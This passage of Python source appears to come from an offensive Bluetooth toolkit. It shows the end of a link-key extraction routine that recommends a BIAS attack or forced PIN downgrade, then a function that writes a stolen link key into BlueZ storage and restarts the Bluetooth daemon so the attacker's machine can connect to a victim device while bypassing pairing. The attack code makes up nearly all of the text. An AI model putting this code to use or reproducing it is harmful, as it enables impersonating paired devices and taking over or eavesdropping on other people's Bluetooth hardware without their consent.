                success(f"Found {len(keys)} potential link key(s)")
                return {"success": True, "keys": keys}
            else:
                info("No complete link keys found in capture")
                info("BR/EDR SSP uses ECDH — passive sniffing alone may not suffice")
                info("Consider: BIAS attack, or force re-pairing with downgraded PIN")
                return {"success": False, "keys": [], "note": "SSP ECDH prevents passive extraction"}

    def inject_link_key(
        self,
        adapter_mac: str,
        remote_mac: str,
        link_key: str,
        key_type: int = 4,
    ) -> bool:
        """Inject a link key into BlueZ storage for a remote device.

        This allows bluetoothctl to connect to the remote device using the
        injected key, bypassing the normal pairing process.

        Args:
            adapter_mac: Local adapter MAC (e.g., from hciconfig).
            remote_mac: Remote device MAC.
            link_key: 128-bit hex link key (32 hex chars).
            key_type: BlueZ key type (4=authenticated, 5=unauthenticated).
        """
        if len(link_key) != 32:
            error(f"Link key must be 32 hex chars, got {len(link_key)}")
            return False

        adapter_dir = adapter_mac.upper().replace("-", ":")
        remote_dir = remote_mac.upper().replace("-", ":")

        info_dir = os.path.join(self.BLUEZ_BT_DIR, adapter_dir, remote_dir)
        info_file = os.path.join(info_dir, "info")

        with phase("Link Key Injection"):
            with step(f"Injecting key into BlueZ for {remote_mac}"):
                os.makedirs(info_dir, exist_ok=True)

                # Read existing info file if present
                existing = ""
                if os.path.exists(info_file):
                    with open(info_file) as f:
                        existing = f.read()

                # Update or add [LinkKey] section
                key_section = f"[LinkKey]\nKey={link_key.upper()}\nType={key_type}\nPINLength=0\n"

                if "[LinkKey]" in existing:
                    # Replace existing LinkKey section — parse line by line
                    # to avoid fragile regex across section boundaries
                    lines = existing.splitlines(keepends=True)
                    new_lines = []
                    in_linkkey = False
                    replaced = False
                    for ln in lines:
                        if ln.strip() == "[LinkKey]":
                            in_linkkey = True
                            if not replaced:
                                new_lines.append(key_section)
                                replaced = True
                            continue
                        if in_linkkey:
                            # Skip old LinkKey lines until next section or EOF
                            if ln.strip().startswith("[") and ln.strip() != "[LinkKey]":
                                in_linkkey = False
                                new_lines.append(ln)
                            # else: skip this line (old key data)
                            continue
                        new_lines.append(ln)
                    new_content = "".join(new_lines)
                else:
                    new_content = existing.rstrip() + "\n\n" + key_section

                with open(info_file, "w") as f:
                    f.write(new_content)

                success(f"Link key injected: {info_file}")
                info("Restart bluetoothd for changes to take effect:")
                info("  sudo systemctl restart bluetooth")

            # Restart BlueZ to pick up the new key
            with step("Restarting BlueZ daemon"):
                result = run_cmd(["sudo", "systemctl", "restart", "bluetooth"], timeout=10)
                if result.returncode == 0:
                    success("BlueZ restarted — link key active")
                    time.sleep(2)  # Wait for daemon
                else:
                    warning("Could not restart BlueZ (may need manual restart)")

        return True

    def get_adapter_mac(self, hci: str = "hci0") -> str | None:
        """Get the current MAC address of the local adapter."""
        result = run_cmd(["hciconfig", hci], timeout=5)
        if result.returncode == 0:
            m = re.search(r"BD Address:\s*([0-9A-Fa-f:]{17})", result.stdout)
            if m:
                return m.group(1).upper()
        return None
